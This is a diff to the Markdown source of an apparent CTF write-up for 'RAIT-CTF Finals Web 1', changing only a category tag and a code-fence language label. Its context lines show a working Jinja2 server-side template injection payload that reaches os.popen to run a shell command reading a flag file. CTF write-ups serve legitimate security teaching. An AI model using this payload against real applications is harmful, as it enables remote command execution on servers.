@@ -3,7 +3,7 @@ title: "RAIT-CTF Finals Web 1"
 description: "Writeup for RAIT-CTF Finals Web 1 from RAIT-CTF 2026 Finals."
 date: 2026-07-06 22:45:00
 categories:
-  - [Writeups, 周刊]
+  - [Writeups]
 tags:
   - RAIT-CTF
   - Web Exploitation
@@ -53,7 +53,7 @@ This returns an admin session cookie like:
 We use a standard Python Jailbreak payload to access `os.popen`. The payload uses the `url_for` global to access builtins -> `import os` -> `popen`.
 
 **SSTI Payload:**
-```jinja2
+```html
 {{ url_for.__globals__['__builtins__']['__import__']('os').popen('cat /app/data/safe_flag.txt').read() }}
 ```
 
